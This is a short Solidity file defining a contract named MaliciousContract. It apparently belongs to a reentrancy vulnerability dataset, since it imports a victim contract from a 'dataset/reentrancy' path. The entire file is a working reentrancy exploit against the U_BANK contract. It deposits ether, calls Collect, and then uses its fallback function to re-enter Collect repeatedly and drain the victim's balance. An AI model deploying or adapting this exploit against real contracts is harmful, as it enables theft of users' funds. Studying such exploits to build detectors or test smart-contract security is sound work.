pragma solidity ^0.4.24;

import "../dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol";

contract MaliciousContract {
    U_BANK u_bank;

    constructor(address _victimAddress) public {
        u_bank = U_BANK(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(
            amount >= 1 ether,
            "Must attempt and attack with at least 1 ether"
        );
        u_bank.Collect(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        u_bank.Put.value(msg.value)(1);
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(u_bank).balance >= 2 ether) {
            u_bank.Collect(2 ether);
        }
    }
}
